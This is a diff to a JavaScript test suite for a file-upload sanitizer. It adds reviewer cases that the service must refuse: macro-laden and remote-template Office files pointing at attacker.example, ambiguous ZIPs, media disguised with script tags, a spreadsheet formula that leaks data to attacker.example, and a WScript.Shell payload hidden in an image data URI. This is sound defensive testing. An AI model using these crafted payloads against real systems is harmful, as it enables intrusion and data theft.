@@ -17,8 +17,9 @@
  */
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
+import { deflateRawSync } from 'node:zlib'
 import {
-  b64, cop, DROP_TOKEN, fixture as baseFixture, jpegWithMetadata, leaksMetadata, mod, publicCall, SESSION, setupInputSuite, SHARE_TOKEN,
+  b64, cop, DROP_TOKEN, fixture as baseFixture, INTAKE_TOKEN, jpegWithMetadata, leaksMetadata, mod, publicCall, SESSION, setupInputSuite, SHARE_TOKEN,
 } from './cop-input-harness.mjs'
 import { JPEG_PLAIN } from './fixtures/images.mjs'
 import { migration } from './cop-input-harness.mjs'
@@ -30,7 +31,7 @@ async function fixture(options = {}) {
   return made
 }
 
-setupInputSuite(['serviceAuth', 'copCaller', 'middleware', 'sanitize', 'uploads', 'upload', 'publicUpload', 'surveyUpload'])
+setupInputSuite(['serviceAuth', 'copCaller', 'middleware', 'sanitize', 'uploads', 'upload', 'publicUpload', 'surveyUpload', 'intakeSubmit', 'submissions', 'copIngest'])
 
 // ── Crafted fixtures ──────────────────────────────────────────────
 
@@ -50,22 +51,27 @@ function crc32(bytes) {
   return (c ^ 0xffffffff) >>> 0
 }
 
-/** A real (stored, uncompressed) ZIP archive. */
-function zip(entries) {
+/**
+ * A real ZIP archive. Entries are stored, or deflated with `{ deflate: true }` (as
+ * Office writes them), so the sniffer's inflate path is exercised too.
+ */
+function zip(entries, { comment = new Uint8Array() } = {}) {
   const locals = []
   const centrals = []
   let offset = 0
-  for (const [name, content] of entries) {
+  for (const [name, content, options = {}] of entries) {
     const nameBytes = enc(name)
-    const data = typeof content === 'string' ? enc(content) : content
-    const crc = crc32(data)
+    const raw = typeof content === 'string' ? enc(content) : content
+    const data = options.deflate ? new Uint8Array(deflateRawSync(raw)) : raw
+    const method = options.deflate ? 8 : 0
+    const crc = crc32(raw)
     const local = Buffer.alloc(30)
-    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 6); local.writeUInt16LE(0, 8)
-    local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22)
+    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 6); local.writeUInt16LE(method, 8)
+    local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(raw.length, 22)
     local.writeUInt16LE(nameBytes.length, 26); local.writeUInt16LE(0, 28)
     const central = Buffer.alloc(46)
-    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6)
-    central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(data.length, 24)
+    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(method, 10)
+    central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(raw.length, 24)
     central.writeUInt16LE(nameBytes.length, 28); central.writeUInt32LE(offset, 42)
     locals.push(local, Buffer.from(nameBytes), Buffer.from(data))
     centrals.push(central, Buffer.from(nameBytes))
@@ -74,8 +80,8 @@ function zip(entries) {
   const cd = Buffer.concat(centrals)
   const eocd = Buffer.alloc(22)
   eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10)
-  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16)
-  return new Uint8Array(Buffer.concat([...locals, cd, eocd]))
+  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16); eocd.writeUInt16LE(comment.length, 20)
+  return new Uint8Array(Buffer.concat([...locals, cd, eocd, Buffer.from(comment)]))
 }
 
 const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
@@ -101,9 +107,12 @@ const M4A = new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('M4A \0\0\0\0M
 const MP3 = new Uint8Array([...enc('ID3'), 4, 0, 0, 0, 0, 0, 0, 0xff, 0xfb, 0x90, 0x64])
 const MP3_FRAME = new Uint8Array([0xff, 0xfb, 0x90, 0x64, 0, 0, 0, 0])
 const AAC = new Uint8Array([0xff, 0xf1, 0x50, 0x80, 0x02, 0x1f, 0xfc])
-const OGG_OPUS = new Uint8Array([...enc('OggS'), 0, 2, ...new Array(22).fill(0), 1, 19, ...enc('OpusHead'), 1, 2])
-const OGG_THEORA = new Uint8Array([...enc('OggS'), 0, 2, ...new Array(22).fill(0), 1, 42, 0x80, ...enc('theora')])
-const WAV = new Uint8Array([...enc('RIFF'), 36, 0, 0, 0, ...enc('WAVEfmt '), 16, 0, 0, 0])
+/** One Ogg page: header (27 bytes: capture, version, type, granule, serial, seq, crc, segments), segment table, data. */
+const oggPage = (type, packet) => new Uint8Array([...enc('OggS'), 0, type, ...new Array(20).fill(0), 1, packet.length, ...packet])
+const OPUS_HEAD = [...enc('OpusHead'), 1, 2, 0x38, 1, 0x80, 0xbb, 0, 0, 0, 0, 0]
+const OGG_OPUS = new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(0, [...enc('OpusTags'), 0, 0, 0, 0])])
+const OGG_THEORA = oggPage(2, [0x80, ...enc('theora'), 3, 2, 1])
+const WAV = new Uint8Array([...enc('RIFF'), 36, 0, 0, 0, ...enc('WAVEfmt '), 16, 0, 0, 0, 1, 0, 1, 0, 0x44, 0xac, 0, 0, 0x88, 0x58, 1, 0, 2, 0, 16, 0, ...enc('data'), 0, 0, 0, 0])
 const WEBM = new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0x9f, 0x42, 0x86, 0x81])
 const EXE = new Uint8Array([...enc('MZ'), 0x90, 0, 3, 0, 0, 0, 4, 0])
 const ELF = new Uint8Array([0x7f, ...enc('ELF'), 2, 1, 1, 0])
@@ -178,8 +187,8 @@ test('images still lose their metadata and say so', async () => {
 test('macro-enabled Office, embedded programs, archives, video, programs and markup are refused', async () => {
   const { env, r2 } = await fixture()
   const cases = [
-    ['macros.docm', DOCM, /macros or programs/],
-    ['exe-inside.docx', DOCX_WITH_EXE, /macros or programs/],
+    ['macros.docm', DOCM, /macros, embedded objects or programs/],
+    ['exe-inside.docx', DOCX_WITH_EXE, /macros, embedded objects or programs/],
     ['macro.odt', ODT_MACRO, /macros/],
     ['bundle.zip', PLAIN_ZIP, /archives can't be added/],
     ['clip.mp4', MP4_VIDEO, /videos can't be added/],
@@ -287,4 +296,127 @@ test('uploads are for the COP\'s own people, not every signed-in reader of a pub
   db.prepare('UPDATE cop_sessions SET is_public = 1 WHERE id = ?').run(SESSION)
   assert.equal((await getUpload(env, 'attacker', up.id)).status, 403, 'signed in, not on the COP')
   assert.equal((await getUpload(env, 'viewer', up.id)).status, 200, 'a viewer collaborator')
+})
+
+// ── Security review 2026-10-23 (reviewer's cases, scratchpad/rtp/cases.mjs) ──
+
+const CT_MACRO = '<Types><Default Extension="dat" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'
+const rels = (...items) => `<?xml version="1.0"?><Relationships>${items.join('')}</Relationships>`
+const rel = (type, target, mode) => `<Relationship Id="r${Math.random().toString(36).slice(2, 6)}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${mode ? ` TargetMode="${mode}"` : ''}/>`
+const docx = (...extra) => zip([['[Content_Types].xml', CT, { deflate: true }], ['word/document.xml', '<w:document/>', { deflate: true }], ...extra])
+const FAKE_EOCD = new Uint8Array([0x50, 0x4b, 0x05, 0x06, ...new Array(18).fill(0)])
+const id3 = (...rest) => new Uint8Array([...enc('ID3'), 4, 0, 0, 0, 0, 0, 0, ...rest])
+
+test('reviewer cases: hidden macros, embedded objects, remote templates, ambiguous archives and disguised media are refused', async () => {
+  const { env, r2 } = await fixture()
+  const refused = [
+    ['docm: vbaProject renamed to x.dat, macro-enabled content type (deflated)', zip([
+      ['[Content_Types].xml', CT_MACRO, { deflate: true }], ['word/document.xml', '<w:document/>', { deflate: true }],
+      ['word/_rels/document.xml.rels', '<Relationships><Relationship Id="r1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="x.dat"/></Relationships>', { deflate: true }],
+      ['word/x.dat', OLE]])],
+    ['vbaProject relationship alone', docx(['word/_rels/document.xml.rels', '<Relationships><Relationship Id="r1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="x.dat"/></Relationships>', { deflate: true }])],
+    ['word\\vbaProject.bin (backslash path)', docx(['word\\vbaProject.bin', OLE])],
+    ['OLE package word/embeddings/oleObject1.bin', docx(['word/embeddings/oleObject1.bin', OLE])],
+    ['embedded macro-enabled workbook', docx(['word/embeddings/Microsoft_Excel_Macro-Enabled_Worksheet1.xlsm', 'PK'])],
+    ['embedded macro-enabled template (.dotm)', docx(['word/embeddings/t.dotm', 'PK'])],
+    ['remote template (attachedTemplate, External)', docx(['word/_rels/settings.xml.rels', rels(rel('attachedTemplate', 'https://attacker.example/t.dotm', 'External')), { deflate: true }])],
+    ['remote OLE object (External)', docx(['word/_rels/document.xml.rels', rels(rel('oleObject', 'https://attacker.example/o.bin', 'External')), { deflate: true }])],
+    ['remote frame (External)', docx(['word/_rels/webSettings.xml.rels', rels(rel('frame', 'https://attacker.example/f', 'External'))])],
+    ['remote sub-document (External)', docx(['word/_rels/document.xml.rels', rels(rel('subDocument', 'https://attacker.example/s.docx', 'External'))])],
+    ['OLE object content type', zip([['[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/></Types>', { deflate: true }], ['word/document.xml', '<w:document/>']])],
+    ['ODT with macros inside an embedded object (Object 1/Basic/)', zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Object 1/Basic/Standard/Module1.xml', '<script/>']])],
+    ['ODT with Scripts/', zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Scripts/python/run.py', 'import os']])],
+    ['ambiguous ZIP: a second end-of-directory record in the comment', zip([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>']], { comment: FAKE_EOCD })],
+    ['[Content_Types].xml inflating past 1 MB', zip([['[Content_Types].xml', '<Types>' + ' '.repeat(1_200_000) + '</Types>', { deflate: true }], ['word/document.xml', '<w:document/>']])],
+    ['ID3 tag + MP4 video', id3(...enc('\0\0\0\x18ftypisom\0\0\x02\0isommp41'), ...enc('hdlr....vide'))],
+    ['ID3 tag + HTML', id3(...enc('<html><script>alert(1)</script>'))],
+    ['ID3 tag + program (MZ)', id3(...enc('MZ'), 0x90, 0)],
+    ['M4A brand with a video track', new Uint8Array(Buffer.concat([box('ftyp', Buffer.from('M4A \0\0\0\0M4A mp42', 'latin1')), box('moov', Buffer.concat([hdlr('soun'), hdlr('vide')]))]))],
+    ['RIFF/WAVE header without a fmt chunk', enc('RIFF\x24\0\0\0WAVE<script>alert(1)</script>')],
+    ['Ogg: an Opus stream and a Theora (video) stream', new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(2, [0x80, ...enc('theora'), 3, 2, 1])])],
+    ['text: HTML after 2 KB of padding', enc('x'.repeat(2100) + '<html><script>alert(1)</script>')],
+    ['text: <img onerror>', enc('<img src=x onerror=alert(1)>')],
+    ['text: javascript: link', enc('click javascript:alert(1)')],
+    ['text: RTF with an embedded object', enc('{\\rtf1\\ansi {\\object\\objemb}}')],
+  ]
+  for (const [name, bytes] of refused) {
+    const res = await upload(env, 'owner', bytes, { headers: { 'X-File-Name': 'file' } })
+    assert.equal(res.status, 415, `${name}: ${await res.clone().text()}`)
+    assert.equal((await res.json()).code, 'UNSUPPORTED_FILE', name)
+  }
+  assert.equal(r2.objects.size, 0)
+})
+
+test('the same checks pass ordinary files: deflated docx with a hyperlink, MP3 after ID3, Ogg with two audio streams, plain JavaScript as text', async () => {
+  const { env } = await fixture()
+  const ordinary = docx(['word/_rels/document.xml.rels', rels(rel('hyperlink', 'https://news.example/a', 'External'), rel('styles', 'styles.xml')), { deflate: true }])
+  const accepted = [
+    ['report.docx', ordinary, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
+    ['voice.mp3', MP3, 'audio/mpeg'],
+    ['two.ogg', new Uint8Array([...oggPage(2, OPUS_HEAD), ...oggPage(2, [1, ...enc('vorbis'), 0, 0, 0, 0]), ...oggPage(0, [1, 2, 3])]), 'audio/ogg'],
+    ['notes.txt', enc('var s = new ActiveXObject("WScript.Shell")\n'), 'text/plain'],
+  ]
+  for (const [name, bytes, type] of accepted) {
+    const res = await upload(env, 'owner', bytes, { headers: { 'X-File-Name': name } })
+    assert.equal(res.status, 201, `${name}: ${await res.clone().text()}`)
+    assert.equal((await res.json()).upload.content_type, type, name)
+  }
+})
+
+test('a CSV whose cells start like formulas is kept as text, so a spreadsheet won\'t evaluate it', async () => {
+  const { env } = await fixture()
+  const risky = await upload(env, 'owner', enc('name,link\nx,=HYPERLINK("https://attacker.example/?"&A2,"x")\n'), { headers: { 'X-File-Name': 'a.csv' } })
+  const { upload: up } = await risky.json()
+  assert.equal(up.content_type, 'text/plain')
+  const served = await getUpload(env, 'owner', up.id)
+  assert.match(served.headers.get('Content-Disposition'), /\.txt"$/)
+  const plain = await upload(env, 'owner', enc('place,count\nGare du Nord,-12\nSaint-Denis,40\n'), { headers: { 'X-File-Name': 'b.csv' } })
+  assert.equal((await plain.json()).upload.content_type, 'text/csv', 'negative numbers are not formulas')
+})
+
+test('an anonymous intake submission can\'t carry a document: refused at submit, and never filed as one on accept', async () => {
+  const { db, env, r2 } = await fixture()
+  const schema = JSON.stringify([{ name: 'note', type: 'textarea', label: 'Note' }, { name: 'attachment', type: 'file', label: 'Photo' }]).replace(/'/g, "''")
+  db.exec(`UPDATE cop_intake_forms SET form_schema = '${schema}' WHERE id = 'intake-paris'`)
+  db.exec(`INSERT INTO survey_drops (id, title, form_schema, share_token, status, intent, cop_session_id, workspace_id, created_by)
+           VALUES ('intake-paris', 'Paris intake', '${schema}', 'legacy-copy-token', 'active', 'drop', '${SESSION}', 'ws-owner', 1)`)
+  const payload = Buffer.from('var s=new ActiveXObject("WScript.Shell");s.Run("calc")\n').toString('base64')
+  const before = db.prepare('SELECT COUNT(*) AS n FROM survey_responses').get().n
+  const res = await publicCall(env, mod('intakeSubmit'), 'POST', `/api/cop/public/intake/${INTAKE_TOKEN}/submit`, {
+    body: { form_data: { note: 'tip', attachment: `data:image/png;base64,${payload}` } }, params: { token: INTAKE_TOKEN },
+  })
+  assert.equal(res.status, 400, await res.clone().text())
+  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM survey_responses').get().n, before, 'nothing stored')
+
+  // A row stored before the fix still can't become a document upload when accepted.
+  db.prepare(`INSERT INTO survey_responses (id, survey_id, cop_session_id, form_data) VALUES ('sub-legacy', 'intake-paris', ?, ?)`)
+    .run(SESSION, JSON.stringify({ note: 'tip', attachment: `data:image/png;base64,${payload}` }))
+  const accept = await cop(env, 'PUT', `/api/cop/${SESSION}/submissions`, { who: 'owner', body: { id: 'sub-legacy', status: 'accepted' }, handler: mod('submissions'), params: { id: SESSION } })
+  assert.ok(accept.status < 500, await accept.clone().text())
+  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM cop_uploads WHERE source_channel = 'drop'").get().n, 0)
+  assert.equal([...r2.objects.values()].filter((o) => o.httpMetadata?.contentType?.startsWith('text/')).length, 0)
+})
+
+test('per-file hold: attaching a new file retires the old one; held files 409; downloads are never cached', async () => {
+  const { db, env } = await fixture()
+  const first = await (await upload(env, 'owner', DOCX, { query: '?evidence=1', headers: { 'X-File-Name': 'a.docx' } })).json()
+  const evidenceId = String(first.evidence.id)
+  const served = await getUpload(env, 'owner', first.upload.id)
+  assert.equal(served.status, 200)
+  assert.equal(served.headers.get('Cache-Control'), 'no-store')
+
+  const second = await (await upload(env, 'owner', XLSX, { query: `?evidence_id=${evidenceId}`, headers: { 'X-File-Name': 'b.xlsx' } })).json()
+  assert.ok(db.prepare('SELECT archived_at FROM cop_uploads WHERE id = ?').get(first.upload.id).archived_at, 'the old file is archived')
+  assert.equal((await getUpload(env, 'owner', first.upload.id)).status, 404, 'and no longer served')
+  assert.equal((await getUpload(env, 'owner', second.upload.id)).status, 200)
+
+  // An upload that is not the item's current file is never served, archived or not.
+  db.prepare('UPDATE cop_uploads SET archived_at = NULL WHERE id = ?').run(first.upload.id)
+  assert.equal((await getUpload(env, 'owner', first.upload.id)).status, 404)
+
+  db.prepare("UPDATE evidence_items SET metadata = json_set(metadata, '$.scan_state', 'quarantined') WHERE CAST(id AS TEXT) = ?").run(evidenceId)
+  assert.equal((await getUpload(env, 'owner', second.upload.id)).status, 409)
+
+  const image = await (await upload(env, 'owner', jpegWithMetadata(b64(JPEG_PLAIN)))).json()
+  assert.equal((await getUpload(env, 'owner', image.upload.id)).headers.get('Cache-Control'), 'private, max-age=3600')
 })
